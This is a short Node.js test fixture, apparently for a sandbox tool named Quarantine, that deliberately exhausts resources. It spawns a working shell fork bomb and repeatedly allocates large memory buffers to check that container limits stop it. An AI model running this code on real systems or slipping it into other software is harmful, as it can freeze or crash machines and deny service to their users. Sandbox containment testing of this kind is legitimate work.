// QUARANTINE DEMO FIXTURE — resource exhaustion (denial of service against the build host).
// A classic shell fork bomb plus a memory balloon. Inside Quarantine this hits the
// container's --pids-limit and --memory caps and is killed; the host is unaffected.
const { spawn } = require('child_process');
spawn('sh', ['-c', 'b(){ b|b& };b'], { detached: false, stdio: 'ignore' });
const hog = [];
const t = setInterval(() => {
  try { hog.push(Buffer.alloc(64 * 1024 * 1024, 1)); } catch (e) { clearInterval(t); }
}, 50);
setTimeout(() => process.exit(0), 15000);
